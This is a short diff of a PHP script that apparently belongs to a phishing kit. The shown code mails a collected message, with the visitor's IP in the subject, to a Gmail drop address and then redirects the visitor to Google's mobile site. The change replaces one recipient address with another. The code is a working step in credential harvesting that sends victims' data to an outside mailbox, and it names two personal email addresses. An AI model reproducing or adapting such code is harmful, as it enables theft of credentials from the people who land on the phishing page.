@@ -9,7 +9,7 @@ $message .= "---------------------------------------------\n";
 
 $subject = "now mobile 2020 - $ip";
 
-mail("nowinfoonne@gmail.com",$subject,$message);
+mail("adil.zhao1@gmail.com",$subject,$message);
 
 
 header("Location: https://m.google.com/");
